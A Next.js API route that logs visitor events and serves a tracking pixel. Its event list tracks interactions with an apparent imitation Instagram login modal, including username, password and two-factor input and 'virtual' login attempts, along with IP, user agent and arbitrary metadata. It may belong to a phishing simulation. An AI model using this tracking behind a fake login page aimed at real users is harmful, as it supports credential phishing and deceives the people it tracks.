import { type NextRequest } from "next/server";
import { getClientIp } from "@/lib/ip";
import { getStorage, type TrackingEventType } from "@/lib/storage";
import { corsHeaders } from "@/lib/cors";

const VALID_EVENTS: TrackingEventType[] = [
  "page_view",
  "connect_instagram_click",
  "input_username",
  "input_password",
  "input_2fa",
  "modal_login_click",
  "virtual_login_attempt",
  "virtual_2fa_submit",
  "modal_facebook_click",
  "modal_signup_click",
  "modal_forgot_click",
  "modal_close_click",
  "nav_click",
  "product_click",
  "footer_click",
  "dashboard_link_click",
];

function generateId(): string {
  return `${Date.now()}-${Math.random().toString(36).slice(2, 11)}`;
}

function isValidEvent(event: unknown): event is TrackingEventType {
  return typeof event === "string" && VALID_EVENTS.includes(event as TrackingEventType);
}

function buildEvent(
  request: NextRequest,
  eventType: TrackingEventType,
  urlOverride?: string,
  metadata?: Record<string, unknown>
) {
  const searchParams = request.nextUrl.searchParams;
  const url = urlOverride ?? searchParams.get("url") ?? request.headers.get("referer") ?? "";

  return {
    id: generateId(),
    event: eventType,
    ip: getClientIp(request),
    userAgent: request.headers.get("user-agent") ?? "",
    referrer: request.headers.get("referer") ?? "",
    url,
    timestamp: new Date().toISOString(),
    metadata,
  };
}

export async function OPTIONS(request: NextRequest) {
  return new Response(null, {
    status: 204,
    headers: corsHeaders(request),
  });
}

export async function POST(request: NextRequest) {
  try {
    let body: Record<string, unknown> = {};
    try {
      body = (await request.json()) as Record<string, unknown>;
    } catch {
      return Response.json({ error: "Invalid JSON body" }, { status: 400 });
    }

    const eventType = body.event;
    if (!isValidEvent(eventType)) {
      return Response.json(
        { error: `Invalid event type. Allowed: ${VALID_EVENTS.join(", ")}` },
        { status: 400 }
      );
    }

    const metadata = body.metadata && typeof body.metadata === "object"
      ? (body.metadata as Record<string, unknown>)
      : undefined;

    const event = buildEvent(
      request,
      eventType,
      typeof body.url === "string" ? body.url : undefined,
      metadata
    );

    const storage = await getStorage();
    await storage.save(event);

    return Response.json({ success: true, id: event.id }, { headers: corsHeaders(request) });
  } catch (error) {
    console.error("[track] error:", error);
    return Response.json(
      { error: "Internal server error" },
      { status: 500, headers: corsHeaders(request) }
    );
  }
}

export async function GET(request: NextRequest) {
  try {
    const searchParams = request.nextUrl.searchParams;
    const eventType = searchParams.get("event") ?? "";

    if (!isValidEvent(eventType)) {
      return Response.json(
        { error: `Invalid event type. Allowed: ${VALID_EVENTS.join(", ")}` },
        { status: 400 }
      );
    }

    const event = buildEvent(
      request,
      eventType,
      searchParams.get("url") ?? undefined
    );

    const storage = await getStorage();
    await storage.save(event);

    // Return a 1x1 transparent GIF for pixel tracking use cases.
    const pixel = Buffer.from(
      "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
      "base64"
    );

    return new Response(pixel, {
      status: 200,
      headers: {
        "Content-Type": "image/gif",
        "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
        Pragma: "no-cache",
        Expires: "0",
        ...corsHeaders(request),
      },
    });
  } catch (error) {
    console.error("[track] error:", error);
    return Response.json(
      { error: "Internal server error" },
      { status: 500, headers: corsHeaders(request) }
    );
  }
}
